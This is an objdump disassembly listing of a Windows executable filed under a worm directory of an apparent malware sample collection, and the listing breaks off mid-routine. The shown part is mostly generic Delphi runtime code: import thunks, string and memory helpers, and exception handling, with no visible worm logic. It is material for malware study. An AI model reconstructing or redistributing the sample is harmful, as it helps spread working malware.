
malware_samples/worm/07b8f25e7b536f5b6f686c12d04edc37e11347c8acd5c53f98a174723078c365.exe:     file format pei-i386


Disassembly of section CODE:

00401000 <CODE>:
  401000:	04 10                	add    $0x10,%al
  401002:	40                   	inc    %eax
  401003:	00 01                	add    %al,(%ecx)
  401005:	04 42                	add    $0x42,%al
  401007:	79 74                	jns    0x40107d
  401009:	65 01 00             	add    %eax,%gs:(%eax)
  40100c:	00 00                	add    %al,(%eax)
  40100e:	00 ff                	add    %bh,%bh
  401010:	00 00                	add    %al,(%eax)
  401012:	00 90 18 10 40 00    	add    %dl,0x401018(%eax)
  401018:	0a 06                	or     (%esi),%al
  40101a:	53                   	push   %ebx
  40101b:	74 72                	je     0x40108f
  40101d:	69 6e 67 6c 10 40 00 	imul   $0x40106c,0x67(%esi),%ebp
	...
  401040:	6c                   	insb   (%dx),%es:(%edi)
  401041:	10 40 00             	adc    %al,0x0(%eax)
  401044:	04 00                	add    $0x0,%al
  401046:	00 00                	add    %al,(%eax)
  401048:	00 00                	add    %al,(%eax)
  40104a:	00 00                	add    %al,(%eax)
  40104c:	5c                   	pop    %esp
  40104d:	15 40 00 68 15       	adc    $0x15680040,%eax
  401052:	40                   	inc    %eax
  401053:	00 6c 15 40          	add    %ch,0x40(%ebp,%edx,1)
  401057:	00 70 15             	add    %dh,0x15(%eax)
  40105a:	40                   	inc    %eax
  40105b:	00 64 15 40          	add    %ah,0x40(%ebp,%edx,1)
  40105f:	00 40 14             	add    %al,0x14(%eax)
  401062:	40                   	inc    %eax
  401063:	00 5c 14 40          	add    %bl,0x40(%esp,%edx,1)
  401067:	00 98 14 40 00 07    	add    %bl,0x7004014(%eax)
  40106d:	54                   	push   %esp
  40106e:	4f                   	dec    %edi
  40106f:	62 6a 65             	bound  %ebp,0x65(%edx)
  401072:	63 74 ff 25          	arpl   %esi,0x25(%edi,%edi,8)
  401076:	98                   	cwtl
  401077:	01 41 00             	add    %eax,0x0(%ecx)
  40107a:	8b c0                	mov    %eax,%eax
  40107c:	ff 25 94 01 41 00    	jmp    *0x410194
  401082:	8b c0                	mov    %eax,%eax
  401084:	ff 25 90 01 41 00    	jmp    *0x410190
  40108a:	8b c0                	mov    %eax,%eax
  40108c:	ff 25 8c 01 41 00    	jmp    *0x41018c
  401092:	8b c0                	mov    %eax,%eax
  401094:	ff 25 88 01 41 00    	jmp    *0x410188
  40109a:	8b c0                	mov    %eax,%eax
  40109c:	ff 25 84 01 41 00    	jmp    *0x410184
  4010a2:	8b c0                	mov    %eax,%eax
  4010a4:	ff 25 80 01 41 00    	jmp    *0x410180
  4010aa:	8b c0                	mov    %eax,%eax
  4010ac:	ff 25 7c 01 41 00    	jmp    *0x41017c
  4010b2:	8b c0                	mov    %eax,%eax
  4010b4:	ff 25 78 01 41 00    	jmp    *0x410178
  4010ba:	8b c0                	mov    %eax,%eax
  4010bc:	ff 25 74 01 41 00    	jmp    *0x410174
  4010c2:	8b c0                	mov    %eax,%eax
  4010c4:	ff 25 70 01 41 00    	jmp    *0x410170
  4010ca:	8b c0                	mov    %eax,%eax
  4010cc:	ff 25 6c 01 41 00    	jmp    *0x41016c
  4010d2:	8b c0                	mov    %eax,%eax
  4010d4:	ff 25 68 01 41 00    	jmp    *0x410168
  4010da:	8b c0                	mov    %eax,%eax
  4010dc:	ff 25 64 01 41 00    	jmp    *0x410164
  4010e2:	8b c0                	mov    %eax,%eax
  4010e4:	ff 25 a0 01 41 00    	jmp    *0x4101a0
  4010ea:	8b c0                	mov    %eax,%eax
  4010ec:	ff 25 60 01 41 00    	jmp    *0x410160
  4010f2:	8b c0                	mov    %eax,%eax
  4010f4:	ff 25 5c 01 41 00    	jmp    *0x41015c
  4010fa:	8b c0                	mov    %eax,%eax
  4010fc:	ff 25 58 01 41 00    	jmp    *0x410158
  401102:	8b c0                	mov    %eax,%eax
  401104:	ff 25 b0 01 41 00    	jmp    *0x4101b0
  40110a:	8b c0                	mov    %eax,%eax
  40110c:	ff 25 ac 01 41 00    	jmp    *0x4101ac
  401112:	8b c0                	mov    %eax,%eax
  401114:	ff 25 a8 01 41 00    	jmp    *0x4101a8
  40111a:	8b c0                	mov    %eax,%eax
  40111c:	ff 25 54 01 41 00    	jmp    *0x410154
  401122:	8b c0                	mov    %eax,%eax
  401124:	50                   	push   %eax
  401125:	a1 3c d0 40 00       	mov    0x40d03c,%eax
  40112a:	50                   	push   %eax
  40112b:	a1 90 e5 40 00       	mov    0x40e590,%eax
  401130:	50                   	push   %eax
  401131:	e8 46 ff ff ff       	call   0x40107c
  401136:	c3                   	ret
  401137:	90                   	nop
  401138:	53                   	push   %ebx
  401139:	8b d8                	mov    %eax,%ebx
  40113b:	53                   	push   %ebx
  40113c:	a1 3c d0 40 00       	mov    0x40d03c,%eax
  401141:	83 e0 01             	and    $0x1,%eax
  401144:	50                   	push   %eax
  401145:	a1 90 e5 40 00       	mov    0x40e590,%eax
  40114a:	50                   	push   %eax
  40114b:	e8 3c ff ff ff       	call   0x40108c
  401150:	83 f8 01             	cmp    $0x1,%eax
  401153:	1b c0                	sbb    %eax,%eax
  401155:	f7 d8                	neg    %eax
  401157:	83 e0 7f             	and    $0x7f,%eax
  40115a:	5b                   	pop    %ebx
  40115b:	c3                   	ret
  40115c:	52                   	push   %edx
  40115d:	50                   	push   %eax
  40115e:	a1 3c d0 40 00       	mov    0x40d03c,%eax
  401163:	83 e0 00             	and    $0x0,%eax
  401166:	50                   	push   %eax
  401167:	a1 90 e5 40 00       	mov    0x40e590,%eax
  40116c:	50                   	push   %eax
  40116d:	e8 12 ff ff ff       	call   0x401084
  401172:	c3                   	ret
  401173:	90                   	nop
  401174:	85 c0                	test   %eax,%eax
  401176:	74 0a                	je     0x401182
  401178:	ff 15 40 d0 40 00    	call   *0x40d040
  40117e:	09 c0                	or     %eax,%eax
  401180:	74 01                	je     0x401183
  401182:	c3                   	ret
  401183:	b0 01                	mov    $0x1,%al
  401185:	e9 c2 00 00 00       	jmp    0x40124c
  40118a:	c3                   	ret
  40118b:	90                   	nop
  40118c:	85 c0                	test   %eax,%eax
  40118e:	74 0a                	je     0x40119a
  401190:	ff 15 44 d0 40 00    	call   *0x40d044
  401196:	09 c0                	or     %eax,%eax
  401198:	75 01                	jne    0x40119b
  40119a:	c3                   	ret
  40119b:	b0 02                	mov    $0x2,%al
  40119d:	e9 aa 00 00 00       	jmp    0x40124c
  4011a2:	c3                   	ret
  4011a3:	90                   	nop
  4011a4:	8b 08                	mov    (%eax),%ecx
  4011a6:	85 c9                	test   %ecx,%ecx
  4011a8:	74 32                	je     0x4011dc
  4011aa:	85 d2                	test   %edx,%edx
  4011ac:	74 18                	je     0x4011c6
  4011ae:	50                   	push   %eax
  4011af:	89 c8                	mov    %ecx,%eax
  4011b1:	ff 15 48 d0 40 00    	call   *0x40d048
  4011b7:	59                   	pop    %ecx
  4011b8:	09 c0                	or     %eax,%eax
  4011ba:	74 19                	je     0x4011d5
  4011bc:	89 01                	mov    %eax,(%ecx)
  4011be:	c3                   	ret
  4011bf:	b0 02                	mov    $0x2,%al
  4011c1:	e9 86 00 00 00       	jmp    0x40124c
  4011c6:	89 10                	mov    %edx,(%eax)
  4011c8:	89 c8                	mov    %ecx,%eax
  4011ca:	ff 15 44 d0 40 00    	call   *0x40d044
  4011d0:	09 c0                	or     %eax,%eax
  4011d2:	75 eb                	jne    0x4011bf
  4011d4:	c3                   	ret
  4011d5:	b0 01                	mov    $0x1,%al
  4011d7:	e9 70 00 00 00       	jmp    0x40124c
  4011dc:	85 d2                	test   %edx,%edx
  4011de:	74 10                	je     0x4011f0
  4011e0:	50                   	push   %eax
  4011e1:	89 d0                	mov    %edx,%eax
  4011e3:	ff 15 40 d0 40 00    	call   *0x40d040
  4011e9:	59                   	pop    %ecx
  4011ea:	09 c0                	or     %eax,%eax
  4011ec:	74 e7                	je     0x4011d5
  4011ee:	89 01                	mov    %eax,(%ecx)
  4011f0:	c3                   	ret
  4011f1:	8d 40 00             	lea    0x0(%eax),%eax
  4011f4:	89 15 04 d0 40 00    	mov    %edx,0x40d004
  4011fa:	e8 a9 08 00 00       	call   0x401aa8
  4011ff:	c3                   	ret
  401200:	53                   	push   %ebx
  401201:	56                   	push   %esi
  401202:	8b f2                	mov    %edx,%esi
  401204:	8b d8                	mov    %eax,%ebx
  401206:	80 e3 7f             	and    $0x7f,%bl
  401209:	83 3d 04 e0 40 00 00 	cmpl   $0x0,0x40e004
  401210:	74 0a                	je     0x40121c
  401212:	8b d6                	mov    %esi,%edx
  401214:	8b c3                	mov    %ebx,%eax
  401216:	ff 15 04 e0 40 00    	call   *0x40e004
  40121c:	84 db                	test   %bl,%bl
  40121e:	75 0d                	jne    0x40122d
  401220:	e8 a7 21 00 00       	call   0x4033cc
  401225:	8b 98 04 00 00 00    	mov    0x4(%eax),%ebx
  40122b:	eb 0f                	jmp    0x40123c
  40122d:	80 fb 18             	cmp    $0x18,%bl
  401230:	77 0a                	ja     0x40123c
  401232:	33 c0                	xor    %eax,%eax
  401234:	8a c3                	mov    %bl,%al
  401236:	8a 98 4c d0 40 00    	mov    0x40d04c(%eax),%bl
  40123c:	33 c0                	xor    %eax,%eax
  40123e:	8a c3                	mov    %bl,%al
  401240:	8b d6                	mov    %esi,%edx
  401242:	e8 ad ff ff ff       	call   0x4011f4
  401247:	5e                   	pop    %esi
  401248:	5b                   	pop    %ebx
  401249:	c3                   	ret
  40124a:	8b c0                	mov    %eax,%eax
  40124c:	83 e0 7f             	and    $0x7f,%eax
  40124f:	8b 14 24             	mov    (%esp),%edx
  401252:	e9 a9 ff ff ff       	jmp    0x401200
  401257:	c3                   	ret
  401258:	83 f9 04             	cmp    $0x4,%ecx
  40125b:	7d 1c                	jge    0x401279
  40125d:	67 e3 57             	jcxz   0x4012b7
  401260:	39 d0                	cmp    %edx,%eax
  401262:	74 53                	je     0x4012b7
  401264:	56                   	push   %esi
  401265:	57                   	push   %edi
  401266:	89 c6                	mov    %eax,%esi
  401268:	89 d7                	mov    %edx,%edi
  40126a:	77 09                	ja     0x401275
  40126c:	8d 74 31 ff          	lea    -0x1(%ecx,%esi,1),%esi
  401270:	8d 7c 39 ff          	lea    -0x1(%ecx,%edi,1),%edi
  401274:	fd                   	std
  401275:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401277:	eb 2c                	jmp    0x4012a5
  401279:	39 d0                	cmp    %edx,%eax
  40127b:	74 3a                	je     0x4012b7
  40127d:	56                   	push   %esi
  40127e:	57                   	push   %edi
  40127f:	89 c6                	mov    %eax,%esi
  401281:	89 d7                	mov    %edx,%edi
  401283:	89 c8                	mov    %ecx,%eax
  401285:	77 20                	ja     0x4012a7
  401287:	83 e1 03             	and    $0x3,%ecx
  40128a:	8d 74 30 ff          	lea    -0x1(%eax,%esi,1),%esi
  40128e:	8d 7c 38 ff          	lea    -0x1(%eax,%edi,1),%edi
  401292:	fd                   	std
  401293:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401295:	c1 f8 02             	sar    $0x2,%eax
  401298:	89 c1                	mov    %eax,%ecx
  40129a:	b8 03 00 00 00       	mov    $0x3,%eax
  40129f:	29 c6                	sub    %eax,%esi
  4012a1:	29 c7                	sub    %eax,%edi
  4012a3:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4012a5:	fc                   	cld
  4012a6:	49                   	dec    %ecx
  4012a7:	c1 f9 02             	sar    $0x2,%ecx
  4012aa:	78 09                	js     0x4012b5
  4012ac:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4012ae:	83 e0 03             	and    $0x3,%eax
  4012b1:	89 c1                	mov    %eax,%ecx
  4012b3:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4012b5:	5f                   	pop    %edi
  4012b6:	5e                   	pop    %esi
  4012b7:	c3                   	ret
  4012b8:	53                   	push   %ebx
  4012b9:	56                   	push   %esi
  4012ba:	57                   	push   %edi
  4012bb:	55                   	push   %ebp
  4012bc:	8b f2                	mov    %edx,%esi
  4012be:	8b d8                	mov    %eax,%ebx
  4012c0:	eb 08                	jmp    0x4012ca
  4012c2:	53                   	push   %ebx
  4012c3:	e8 1c fe ff ff       	call   0x4010e4
  4012c8:	8b d8                	mov    %eax,%ebx
  4012ca:	8a 03                	mov    (%ebx),%al
  4012cc:	84 c0                	test   %al,%al
  4012ce:	74 04                	je     0x4012d4
  4012d0:	3c 20                	cmp    $0x20,%al
  4012d2:	76 ee                	jbe    0x4012c2
  4012d4:	80 3b 22             	cmpb   $0x22,(%ebx)
  4012d7:	75 0b                	jne    0x4012e4
  4012d9:	80 7b 01 22          	cmpb   $0x22,0x1(%ebx)
  4012dd:	75 05                	jne    0x4012e4
  4012df:	83 c3 02             	add    $0x2,%ebx
  4012e2:	eb e6                	jmp    0x4012ca
  4012e4:	33 ed                	xor    %ebp,%ebp
  4012e6:	8b fb                	mov    %ebx,%edi
  4012e8:	eb 43                	jmp    0x40132d
  4012ea:	3c 22                	cmp    $0x22,%al
  4012ec:	75 31                	jne    0x40131f
  4012ee:	53                   	push   %ebx
  4012ef:	e8 f0 fd ff ff       	call   0x4010e4
  4012f4:	8b d8                	mov    %eax,%ebx
  4012f6:	eb 0e                	jmp    0x401306
  4012f8:	53                   	push   %ebx
  4012f9:	e8 e6 fd ff ff       	call   0x4010e4
  4012fe:	8b d0                	mov    %eax,%edx
  401300:	2b d3                	sub    %ebx,%edx
  401302:	03 ea                	add    %edx,%ebp
  401304:	8b d8                	mov    %eax,%ebx
  401306:	8a 03                	mov    (%ebx),%al
  401308:	84 c0                	test   %al,%al
  40130a:	74 04                	je     0x401310
  40130c:	3c 22                	cmp    $0x22,%al
  40130e:	75 e8                	jne    0x4012f8
  401310:	80 3b 00             	cmpb   $0x0,(%ebx)
  401313:	74 18                	je     0x40132d
  401315:	53                   	push   %ebx
  401316:	e8 c9 fd ff ff       	call   0x4010e4
  40131b:	8b d8                	mov    %eax,%ebx
  40131d:	eb 0e                	jmp    0x40132d
  40131f:	53                   	push   %ebx
  401320:	e8 bf fd ff ff       	call   0x4010e4
  401325:	8b d0                	mov    %eax,%edx
  401327:	2b d3                	sub    %ebx,%edx
  401329:	03 ea                	add    %edx,%ebp
  40132b:	8b d8                	mov    %eax,%ebx
  40132d:	8a 03                	mov    (%ebx),%al
  40132f:	3c 20                	cmp    $0x20,%al
  401331:	77 b7                	ja     0x4012ea
  401333:	8b c6                	mov    %esi,%eax
  401335:	8b d5                	mov    %ebp,%edx
  401337:	e8 38 0d 00 00       	call   0x402074
  40133c:	8b df                	mov    %edi,%ebx
  40133e:	8b 3e                	mov    (%esi),%edi
  401340:	33 f6                	xor    %esi,%esi
  401342:	eb 51                	jmp    0x401395
  401344:	3c 22                	cmp    $0x22,%al
  401346:	75 38                	jne    0x401380
  401348:	53                   	push   %ebx
  401349:	e8 96 fd ff ff       	call   0x4010e4
  40134e:	8b d8                	mov    %eax,%ebx
  401350:	eb 15                	jmp    0x401367
  401352:	53                   	push   %ebx
  401353:	e8 8c fd ff ff       	call   0x4010e4
  401358:	3b c3                	cmp    %ebx,%eax
  40135a:	76 0b                	jbe    0x401367
  40135c:	8a 13                	mov    (%ebx),%dl
  40135e:	88 14 37             	mov    %dl,(%edi,%esi,1)
  401361:	43                   	inc    %ebx
  401362:	46                   	inc    %esi
  401363:	3b c3                	cmp    %ebx,%eax
  401365:	77 f5                	ja     0x40135c
  401367:	8a 03                	mov    (%ebx),%al
  401369:	84 c0                	test   %al,%al
  40136b:	74 04                	je     0x401371
  40136d:	3c 22                	cmp    $0x22,%al
  40136f:	75 e1                	jne    0x401352
  401371:	80 3b 00             	cmpb   $0x0,(%ebx)
  401374:	74 1f                	je     0x401395
  401376:	53                   	push   %ebx
  401377:	e8 68 fd ff ff       	call   0x4010e4
  40137c:	8b d8                	mov    %eax,%ebx
  40137e:	eb 15                	jmp    0x401395
  401380:	53                   	push   %ebx
  401381:	e8 5e fd ff ff       	call   0x4010e4
  401386:	3b c3                	cmp    %ebx,%eax
  401388:	76 0b                	jbe    0x401395
  40138a:	8a 13                	mov    (%ebx),%dl
  40138c:	88 14 37             	mov    %dl,(%edi,%esi,1)
  40138f:	43                   	inc    %ebx
  401390:	46                   	inc    %esi
  401391:	3b c3                	cmp    %ebx,%eax
  401393:	77 f5                	ja     0x40138a
  401395:	8a 03                	mov    (%ebx),%al
  401397:	3c 20                	cmp    $0x20,%al
  401399:	77 a9                	ja     0x401344
  40139b:	8b c3                	mov    %ebx,%eax
  40139d:	5d                   	pop    %ebp
  40139e:	5f                   	pop    %edi
  40139f:	5e                   	pop    %esi
  4013a0:	5b                   	pop    %ebx
  4013a1:	c3                   	ret
  4013a2:	8b c0                	mov    %eax,%eax
  4013a4:	53                   	push   %ebx
  4013a5:	56                   	push   %esi
  4013a6:	57                   	push   %edi
  4013a7:	81 c4 f8 fe ff ff    	add    $0xfffffef8,%esp
  4013ad:	8b da                	mov    %edx,%ebx
  4013af:	8b f0                	mov    %eax,%esi
  4013b1:	8b c3                	mov    %ebx,%eax
  4013b3:	e8 08 07 00 00       	call   0x401ac0
  4013b8:	85 f6                	test   %esi,%esi
  4013ba:	75 1e                	jne    0x4013da
  4013bc:	68 05 01 00 00       	push   $0x105
  4013c1:	8d 44 24 04          	lea    0x4(%esp),%eax
  4013c5:	50                   	push   %eax
  4013c6:	6a 00                	push   $0x0
  4013c8:	e8 cf fc ff ff       	call   0x40109c
  4013cd:	8b c8                	mov    %eax,%ecx
  4013cf:	8b d4                	mov    %esp,%edx
  4013d1:	8b c3                	mov    %ebx,%eax
  4013d3:	e8 d4 07 00 00       	call   0x401bac
  4013d8:	eb 1e                	jmp    0x4013f8
  4013da:	e8 e5 fc ff ff       	call   0x4010c4
  4013df:	8b f8                	mov    %eax,%edi
  4013e1:	8b d3                	mov    %ebx,%edx
  4013e3:	8b c7                	mov    %edi,%eax
  4013e5:	e8 ce fe ff ff       	call   0x4012b8
  4013ea:	8b f8                	mov    %eax,%edi
  4013ec:	85 f6                	test   %esi,%esi
  4013ee:	74 08                	je     0x4013f8
  4013f0:	83 3b 00             	cmpl   $0x0,(%ebx)
  4013f3:	74 03                	je     0x4013f8
  4013f5:	4e                   	dec    %esi
  4013f6:	eb e9                	jmp    0x4013e1
  4013f8:	81 c4 08 01 00 00    	add    $0x108,%esp
  4013fe:	5f                   	pop    %edi
  4013ff:	5e                   	pop    %esi
  401400:	5b                   	pop    %ebx
  401401:	c3                   	ret
  401402:	8b c0                	mov    %eax,%eax
  401404:	88 10                	mov    %dl,(%eax)
  401406:	c3                   	ret
  401407:	90                   	nop
  401408:	3c 61                	cmp    $0x61,%al
  40140a:	72 06                	jb     0x401412
  40140c:	3c 7a                	cmp    $0x7a,%al
  40140e:	77 02                	ja     0x401412
  401410:	2c 20                	sub    $0x20,%al
  401412:	c3                   	ret
  401413:	90                   	nop
  401414:	57                   	push   %edi
  401415:	89 c7                	mov    %eax,%edi
  401417:	88 cd                	mov    %cl,%ch
  401419:	89 c8                	mov    %ecx,%eax
  40141b:	c1 e0 10             	shl    $0x10,%eax
  40141e:	66 89 c8             	mov    %cx,%ax
  401421:	89 d1                	mov    %edx,%ecx
  401423:	c1 f9 02             	sar    $0x2,%ecx
  401426:	78 09                	js     0x401431
  401428:	f3 ab                	rep stos %eax,%es:(%edi)
  40142a:	89 d1                	mov    %edx,%ecx
  40142c:	83 e1 03             	and    $0x3,%ecx
  40142f:	f3 aa                	rep stos %al,%es:(%edi)
  401431:	5f                   	pop    %edi
  401432:	c3                   	ret
  401433:	90                   	nop
  401434:	db e3                	fninit
  401436:	9b d9 2d 08 d0 40 00 	fldcw  0x40d008
  40143d:	c3                   	ret
  40143e:	8b c0                	mov    %eax,%eax
  401440:	53                   	push   %ebx
  401441:	8b d8                	mov    %eax,%ebx
  401443:	8b c3                	mov    %ebx,%eax
  401445:	e8 26 00 00 00       	call   0x401470
  40144a:	e8 25 fd ff ff       	call   0x401174
  40144f:	8b d0                	mov    %eax,%edx
  401451:	8b c3                	mov    %ebx,%eax
  401453:	e8 5c 00 00 00       	call   0x4014b4
  401458:	5b                   	pop    %ebx
  401459:	c3                   	ret
  40145a:	8b c0                	mov    %eax,%eax
  40145c:	53                   	push   %ebx
  40145d:	8b d8                	mov    %eax,%ebx
  40145f:	8b c3                	mov    %ebx,%eax
  401461:	e8 a6 00 00 00       	call   0x40150c
  401466:	8b c3                	mov    %ebx,%eax
  401468:	e8 1f fd ff ff       	call   0x40118c
  40146d:	5b                   	pop    %ebx
  40146e:	c3                   	ret
  40146f:	90                   	nop
  401470:	83 c0 d8             	add    $0xffffffd8,%eax
  401473:	8b 00                	mov    (%eax),%eax
  401475:	c3                   	ret
  401476:	8b c0                	mov    %eax,%eax
  401478:	84 d2                	test   %dl,%dl
  40147a:	74 08                	je     0x401484
  40147c:	83 c4 f0             	add    $0xfffffff0,%esp
  40147f:	e8 14 01 00 00       	call   0x401598
  401484:	84 d2                	test   %dl,%dl
  401486:	74 0f                	je     0x401497
  401488:	e8 63 01 00 00       	call   0x4015f0
  40148d:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  401494:	83 c4 0c             	add    $0xc,%esp
  401497:	c3                   	ret
  401498:	e8 63 01 00 00       	call   0x401600
  40149d:	84 d2                	test   %dl,%dl
  40149f:	7e 05                	jle    0x4014a6
  4014a1:	e8 42 01 00 00       	call   0x4015e8
  4014a6:	c3                   	ret
  4014a7:	90                   	nop
  4014a8:	85 c0                	test   %eax,%eax
  4014aa:	74 07                	je     0x4014b3
  4014ac:	b2 01                	mov    $0x1,%dl
  4014ae:	8b 08                	mov    (%eax),%ecx
  4014b0:	ff 51 fc             	call   *-0x4(%ecx)
  4014b3:	c3                   	ret
  4014b4:	53                   	push   %ebx
  4014b5:	56                   	push   %esi
  4014b6:	57                   	push   %edi
  4014b7:	89 c3                	mov    %eax,%ebx
  4014b9:	89 d7                	mov    %edx,%edi
  4014bb:	ab                   	stos   %eax,%es:(%edi)
  4014bc:	8b 4b d8             	mov    -0x28(%ebx),%ecx
  4014bf:	31 c0                	xor    %eax,%eax
  4014c1:	51                   	push   %ecx
  4014c2:	c1 e9 02             	shr    $0x2,%ecx
  4014c5:	49                   	dec    %ecx
  4014c6:	f3 ab                	rep stos %eax,%es:(%edi)
  4014c8:	59                   	pop    %ecx
  4014c9:	83 e1 03             	and    $0x3,%ecx
  4014cc:	f3 aa                	rep stos %al,%es:(%edi)
  4014ce:	89 d0                	mov    %edx,%eax
  4014d0:	89 e2                	mov    %esp,%edx
  4014d2:	8b 4b b8             	mov    -0x48(%ebx),%ecx
  4014d5:	85 c9                	test   %ecx,%ecx
  4014d7:	74 01                	je     0x4014da
  4014d9:	51                   	push   %ecx
  4014da:	8b 5b dc             	mov    -0x24(%ebx),%ebx
  4014dd:	85 db                	test   %ebx,%ebx
  4014df:	74 04                	je     0x4014e5
  4014e1:	8b 1b                	mov    (%ebx),%ebx
  4014e3:	eb ed                	jmp    0x4014d2
  4014e5:	39 d4                	cmp    %edx,%esp
  4014e7:	74 1d                	je     0x401506
  4014e9:	5b                   	pop    %ebx
  4014ea:	8b 0b                	mov    (%ebx),%ecx
  4014ec:	83 c3 04             	add    $0x4,%ebx
  4014ef:	8b 73 10             	mov    0x10(%ebx),%esi
  4014f2:	85 f6                	test   %esi,%esi
  4014f4:	74 06                	je     0x4014fc
  4014f6:	8b 7b 14             	mov    0x14(%ebx),%edi
  4014f9:	89 34 07             	mov    %esi,(%edi,%eax,1)
  4014fc:	83 c3 1c             	add    $0x1c,%ebx
  4014ff:	49                   	dec    %ecx
  401500:	75 ed                	jne    0x4014ef
  401502:	39 d4                	cmp    %edx,%esp
  401504:	75 e3                	jne    0x4014e9
  401506:	5f                   	pop    %edi
  401507:	5e                   	pop    %esi
  401508:	5b                   	pop    %ebx
  401509:	c3                   	ret
  40150a:	8b c0                	mov    %eax,%eax
  40150c:	53                   	push   %ebx
  40150d:	56                   	push   %esi
  40150e:	89 c3                	mov    %eax,%ebx
  401510:	89 c6                	mov    %eax,%esi
  401512:	8b 36                	mov    (%esi),%esi
  401514:	8b 56 c0             	mov    -0x40(%esi),%edx
  401517:	8b 76 dc             	mov    -0x24(%esi),%esi
  40151a:	85 d2                	test   %edx,%edx
  40151c:	74 07                	je     0x401525
  40151e:	e8 cd 0f 00 00       	call   0x4024f0
  401523:	89 d8                	mov    %ebx,%eax
  401525:	85 f6                	test   %esi,%esi
  401527:	75 e9                	jne    0x401512
  401529:	5e                   	pop    %esi
  40152a:	5b                   	pop    %ebx
  40152b:	c3                   	ret
  40152c:	57                   	push   %edi
  40152d:	96                   	xchg   %eax,%esi
  40152e:	eb 02                	jmp    0x401532
  401530:	8b 36                	mov    (%esi),%esi
  401532:	8b 7e d0             	mov    -0x30(%esi),%edi
  401535:	85 ff                	test   %edi,%edi
  401537:	74 0d                	je     0x401546
  401539:	0f b7 0f             	movzwl (%edi),%ecx
  40153c:	51                   	push   %ecx
  40153d:	83 c7 02             	add    $0x2,%edi
  401540:	f2 66 af             	repnz scas %es:(%edi),%ax
  401543:	74 0a                	je     0x40154f
  401545:	59                   	pop    %ecx
  401546:	8b 76 dc             	mov    -0x24(%esi),%esi
  401549:	85 f6                	test   %esi,%esi
  40154b:	75 e3                	jne    0x401530
  40154d:	5f                   	pop    %edi
  40154e:	c3                   	ret
  40154f:	58                   	pop    %eax
  401550:	01 c0                	add    %eax,%eax
  401552:	29 c8                	sub    %ecx,%eax
  401554:	8b 74 47 fc          	mov    -0x4(%edi,%eax,2),%esi
  401558:	5f                   	pop    %edi
  401559:	c3                   	ret
  40155a:	8b c0                	mov    %eax,%eax
  40155c:	b8 ff ff 00 80       	mov    $0x8000ffff,%eax
  401561:	c3                   	ret
  401562:	8b c0                	mov    %eax,%eax
  401564:	c3                   	ret
  401565:	8d 40 00             	lea    0x0(%eax),%eax
  401568:	c3                   	ret
  401569:	8d 40 00             	lea    0x0(%eax),%eax
  40156c:	c3                   	ret
  40156d:	8d 40 00             	lea    0x0(%eax),%eax
  401570:	56                   	push   %esi
  401571:	66 8b 32             	mov    (%edx),%si
  401574:	66 09 f6             	or     %si,%si
  401577:	74 17                	je     0x401590
  401579:	66 81 fe 00 c0       	cmp    $0xc000,%si
  40157e:	73 10                	jae    0x401590
  401580:	50                   	push   %eax
  401581:	8b 00                	mov    (%eax),%eax
  401583:	e8 a4 ff ff ff       	call   0x40152c
  401588:	58                   	pop    %eax
  401589:	74 05                	je     0x401590
  40158b:	89 f1                	mov    %esi,%ecx
  40158d:	5e                   	pop    %esi
  40158e:	ff e1                	jmp    *%ecx
  401590:	5e                   	pop    %esi
  401591:	8b 08                	mov    (%eax),%ecx
  401593:	ff 61 f0             	jmp    *-0x10(%ecx)
  401596:	c3                   	ret
  401597:	90                   	nop
  401598:	52                   	push   %edx
  401599:	51                   	push   %ecx
  40159a:	53                   	push   %ebx
  40159b:	84 d2                	test   %dl,%dl
  40159d:	7c 03                	jl     0x4015a2
  40159f:	ff 50 f4             	call   *-0xc(%eax)
  4015a2:	31 d2                	xor    %edx,%edx
  4015a4:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4015a8:	64 8b 1a             	mov    %fs:(%edx),%ebx
  4015ab:	89 19                	mov    %ebx,(%ecx)
  4015ad:	89 69 08             	mov    %ebp,0x8(%ecx)
  4015b0:	c7 41 04 c1 15 40 00 	movl   $0x4015c1,0x4(%ecx)
  4015b7:	89 41 0c             	mov    %eax,0xc(%ecx)
  4015ba:	64 89 0a             	mov    %ecx,%fs:(%edx)
  4015bd:	5b                   	pop    %ebx
  4015be:	59                   	pop    %ecx
  4015bf:	5a                   	pop    %edx
  4015c0:	c3                   	ret
  4015c1:	e9 1a 01 00 00       	jmp    0x4016e0
  4015c6:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4015ca:	8b 40 0c             	mov    0xc(%eax),%eax
  4015cd:	85 c0                	test   %eax,%eax
  4015cf:	74 0e                	je     0x4015df
  4015d1:	8b 08                	mov    (%eax),%ecx
  4015d3:	b2 81                	mov    $0x81,%dl
  4015d5:	50                   	push   %eax
  4015d6:	ff 51 fc             	call   *-0x4(%ecx)
  4015d9:	58                   	pop    %eax
  4015da:	e8 09 00 00 00       	call   0x4015e8
  4015df:	e8 60 02 00 00       	call   0x401844
  4015e4:	c3                   	ret
  4015e5:	8d 40 00             	lea    0x0(%eax),%eax
  4015e8:	8b 10                	mov    (%eax),%edx
  4015ea:	ff 52 f8             	call   *-0x8(%edx)
  4015ed:	c3                   	ret
  4015ee:	8b c0                	mov    %eax,%eax
  4015f0:	53                   	push   %ebx
  4015f1:	8b d8                	mov    %eax,%ebx
  4015f3:	8b c3                	mov    %ebx,%eax
  4015f5:	8b 10                	mov    (%eax),%edx
  4015f7:	ff 52 e4             	call   *-0x1c(%edx)
  4015fa:	8b c3                	mov    %ebx,%eax
  4015fc:	5b                   	pop    %ebx
  4015fd:	c3                   	ret
  4015fe:	8b c0                	mov    %eax,%eax
  401600:	84 d2                	test   %dl,%dl
  401602:	7f 01                	jg     0x401605
  401604:	c3                   	ret
  401605:	50                   	push   %eax
  401606:	52                   	push   %edx
  401607:	8b 10                	mov    (%eax),%edx
  401609:	ff 52 e8             	call   *-0x18(%edx)
  40160c:	5a                   	pop    %edx
  40160d:	58                   	pop    %eax
  40160e:	c3                   	ret
  40160f:	90                   	nop
  401610:	80 3d 0c d0 40 00 01 	cmpb   $0x1,0x40d00c
  401617:	76 11                	jbe    0x40162a
  401619:	6a 00                	push   $0x0
  40161b:	6a 00                	push   $0x0
  40161d:	6a 00                	push   $0x0
  40161f:	68 df fa ed 0e       	push   $0xeedfadf
